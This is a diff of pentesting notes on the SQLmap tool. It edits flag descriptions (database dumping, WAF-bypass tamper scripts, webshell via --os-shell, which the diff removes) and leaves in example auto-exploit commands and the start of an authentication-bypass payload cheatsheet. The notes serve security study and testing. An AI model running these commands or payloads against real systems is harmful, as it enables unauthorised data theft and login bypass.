@@ -1,8 +1,5 @@
 SQLmap is an automated [[SQLi]] discovery and exploitation tool. Below are some basic usage options. 
 
->[!warning] 
->Not to be used in some certification exams because of its auto-exploitation capabilities. 
-
 # Flags
 ```shell
 --wizard # Add flags dynamically
@@ -10,18 +7,7 @@ SQLmap is an automated [[SQLi]] discovery and exploitation tool. Below are some 
 --tables # Extract table names from a database
 -D # select a database to query
 -T # Select a table to query
---dump # Dump an entire database
---batch # Automatically fill answers to prompts with defaults (opts into cracking passwords, among other things)
---level # Set level of testing to perform (1-5) (higher numbers = more tests)
---risk # Set a risk profile for Sqlmap to accept. (1-3) 
-
---csrf-token=tokenval # Specify csrf token for bypass
---random-agent # Use random User-Agent headers from different browsers to defeat User-Agent filtering
---tamper=tamperscriptval # Specify a tamper script to bypass WAF filtering
---id-dba # Ask database if it is running as a DBA
---file-read=filetoread # (with DBA) Read a file from disk
---file-write=filetowrite # (with DBA) Write a file to disk
---os-shell # (with DBA) Drop a webshell and use it as an interactive shell
+--dump # Dump an entire database table
 ```
 # Examples
 ```shell
@@ -29,11 +15,12 @@ sqlmap --url="<url>" -p username --user-agent=SQLMAP --random-agent --threads=10
 
 sqlmap -r sqli.req --safe-url=http://10.10.10.10/ --mobile --safe-freq=1 # Use mobile user agent and separate .req file
 
-sqlmap -u "http://example.com/" --crawl=1 --random-agent --batch --forms --threads=5 --level=5 --risk=3 # Crawl site and automatically exploit vulnerabilities
+sqlmap -u "http://example.com/" --crawl=1 --random-agent --batch --forms --threads=5 --level=5 --risk=3 # Crawl site and automatically expoit vulnerabilities
+
 ```
 
 # Authentication Bypass Cheatsheet
-```
+```shell
 '-'
 ' '
 '&'
